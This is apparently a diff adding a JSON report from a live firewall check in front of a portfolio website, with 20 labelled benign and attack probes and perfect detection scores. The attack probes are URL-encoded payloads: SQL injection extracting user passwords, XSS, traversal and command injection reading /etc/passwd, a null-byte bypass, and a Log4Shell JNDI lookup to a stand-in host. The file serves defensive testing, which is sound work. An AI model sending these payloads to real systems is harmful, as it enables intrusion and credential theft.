@@ -1,0 +1,254 @@
+{
+  "generated_at": "2026-11-16T05:35:57.916888+00:00",
+  "gateway_url": "https://natrix-security-engine.onrender.com/p/nameetahire-vercel-app",
+  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
+  "origin_rendered": true,
+  "home_title": "Nameet Ahire | AI/ML Engineer & Cloud DevOps Architect Portfolio",
+  "metrics": {
+    "probes": 20,
+    "tp": 10,
+    "fp": 0,
+    "tn": 10,
+    "fn": 0,
+    "accuracy": 1.0,
+    "precision": 1.0,
+    "recall": 1.0,
+    "f1": 1.0,
+    "false_positive_rate": 0.0,
+    "false_negative_rate": 0.0,
+    "benign_latency_ms": {
+      "p50": 1140.9,
+      "p95": 1525.2
+    },
+    "attack_latency_ms": {
+      "p50": 365.7,
+      "p95": 522.3
+    }
+  },
+  "cases": [
+    {
+      "id": "benign_home",
+      "path": "/",
+      "note": "portfolio homepage",
+      "expected": "benign",
+      "status": 200,
+      "blocked": false,
+      "latency_ms": 1525.2,
+      "bytes": 2572,
+      "title": "Nameet Ahire | AI/ML Engineer & Cloud DevOps Architect Portfolio"
+    },
+    {
+      "id": "benign_utm",
+      "path": "/?utm_source=linkedin&utm_medium=social",
+      "note": "campaign query",
+      "expected": "benign",
+      "status": 200,
+      "blocked": false,
+      "latency_ms": 1210.4,
+      "bytes": 2572,
+      "title": "Nameet Ahire | AI/ML Engineer & Cloud DevOps Architect Portfolio"
+    },
+    {
+      "id": "benign_projects",
+      "path": "/projects",
+      "note": "SPA route (origin 404 is still allowed)",
+      "expected": "benign",
+      "status": 404,
+      "blocked": false,
+      "latency_ms": 1020.9,
+      "bytes": 8533,
+      "title": "404: NOT_FOUND"
+    },
+    {
+      "id": "benign_about",
+      "path": "/about",
+      "note": "SPA route (origin 404 is still allowed)",
+      "expected": "benign",
+      "status": 404,
+      "blocked": false,
+      "latency_ms": 1135.8,
+      "bytes": 8533,
+      "title": "404: NOT_FOUND"
+    },
+    {
+      "id": "benign_js",
+      "path": "/assets/index-D1hhdjVN.js",
+      "note": "production JS bundle",
+      "expected": "benign",
+      "status": 200,
+      "blocked": false,
+      "latency_ms": 872.6,
+      "bytes": 875458,
+      "title": ""
+    },
+    {
+      "id": "benign_css",
+      "path": "/assets/index-CKq5S0Fg.css",
+      "note": "production CSS bundle",
+      "expected": "benign",
+      "status": 200,
+      "blocked": false,
+      "latency_ms": 911.2,
+      "bytes": 28726,
+      "title": ""
+    },
+    {
+      "id": "benign_search",
+      "path": "/?q=react",
+      "note": "ordinary search",
+      "expected": "benign",
+      "status": 200,
+      "blocked": false,
+      "latency_ms": 1409.0,
+      "bytes": 2572,
+      "title": "Nameet Ahire | AI/ML Engineer & Cloud DevOps Architect Portfolio"
+    },
+    {
+      "id": "benign_page",
+      "path": "/?page=2&sort=recent",
+      "note": "pagination",
+      "expected": "benign",
+      "status": 200,
+      "blocked": false,
+      "latency_ms": 1140.9,
+      "bytes": 2572,
+      "title": "Nameet Ahire | AI/ML Engineer & Cloud DevOps Architect Portfolio"
+    },
+    {
+      "id": "benign_apostrophe",
+      "path": "/?q=O%27Reilly",
+      "note": "surname with apostrophe",
+      "expected": "benign",
+      "status": 200,
+      "blocked": false,
+      "latency_ms": 1237.7,
+      "bytes": 2572,
+      "title": "Nameet Ahire | AI/ML Engineer & Cloud DevOps Architect Portfolio"
+    },
+    {
+      "id": "benign_email",
+      "path": "/?email=nameet%40example.com",
+      "note": "email parameter",
+      "expected": "benign",
+      "status": 200,
+      "blocked": false,
+      "latency_ms": 1041.1,
+      "bytes": 2572,
+      "title": "Nameet Ahire | AI/ML Engineer & Cloud DevOps Architect Portfolio"
+    },
+    {
+      "id": "sqli_union",
+      "path": "/?id=1%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--",
+      "note": "SQL injection",
+      "expected": "attack",
+      "status": 403,
+      "blocked": true,
+      "latency_ms": 419.2,
+      "bytes": 1164,
+      "title": "403 Forbidden"
+    },
+    {
+      "id": "sqli_or",
+      "path": "/?user=admin%27%20OR%20%271%27%3D%271",
+      "note": "SQL injection",
+      "expected": "attack",
+      "status": 403,
+      "blocked": true,
+      "latency_ms": 407.9,
+      "bytes": 1164,
+      "title": "403 Forbidden"
+    },
+    {
+      "id": "xss_script",
+      "path": "/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+      "note": "reflected XSS",
+      "expected": "attack",
+      "status": 403,
+      "blocked": true,
+      "latency_ms": 267.5,
+      "bytes": 1164,
+      "title": "403 Forbidden"
+    },
+    {
+      "id": "xss_svg",
+      "path": "/?name=%3Csvg%2Fonload%3Dalert(1)%3E",
+      "note": "XSS that evaded the rules",
+      "expected": "attack",
+      "status": 403,
+      "blocked": true,
+      "latency_ms": 365.7,
+      "bytes": 1164,
+      "title": "403 Forbidden"
+    },
+    {
+      "id": "traversal",
+      "path": "/?file=..%2F..%2F..%2Fetc%2Fpasswd",
+      "note": "path traversal",
+      "expected": "attack",
+      "status": 403,
+      "blocked": true,
+      "latency_ms": 269.8,
+      "bytes": 1164,
+      "title": "403 Forbidden"
+    },
+    {
+      "id": "cmd_injection",
+      "path": "/?cmd=%3Bcat%20%2Fetc%2Fpasswd",
+      "note": "command injection",
+      "expected": "attack",
+      "status": 403,
+      "blocked": true,
+      "latency_ms": 257.0,
+      "bytes": 221306,
+      "title": "Blocked"
+    },
+    {
+      "id": "null_byte",
+      "path": "/?file=index.php%00.jpg",
+      "note": "null-byte extension bypass",
+      "expected": "attack",
+      "status": 403,
+      "blocked": true,
+      "latency_ms": 522.3,
+      "bytes": 1164,
+      "title": "403 Forbidden"
+    },
+    {
+      "id": "double_encoded",
+      "path": "/?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+      "note": "double-encoded traversal",
+      "expected": "attack",
+      "status": 403,
+      "blocked": true,
+      "latency_ms": 422.0,
+      "bytes": 1164,
+      "title": "403 Forbidden"
+    },
+    {
+      "id": "scanner_path",
+      "path": "/wp-admin/setup-config.php",
+      "note": "vulnerability scanner",
+      "expected": "attack",
+      "status": 403,
+      "blocked": true,
+      "latency_ms": 318.0,
+      "bytes": 1164,
+      "title": "403 Forbidden"
+    },
+    {
+      "id": "log4shell",
+      "path": "/?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D",
+      "note": "JNDI lookup",
+      "expected": "attack",
+      "status": 403,
+      "blocked": true,
+      "latency_ms": 256.3,
+      "bytes": 221306,
+      "title": "Blocked"
+    }
+  ],
+  "gate_stats_before": null,
+  "gate_stats_after": null,
+  "recent_gate_decisions": [],
+  "note": "Labelled live policy check on a small probe set; not a generalisation estimate."
+}
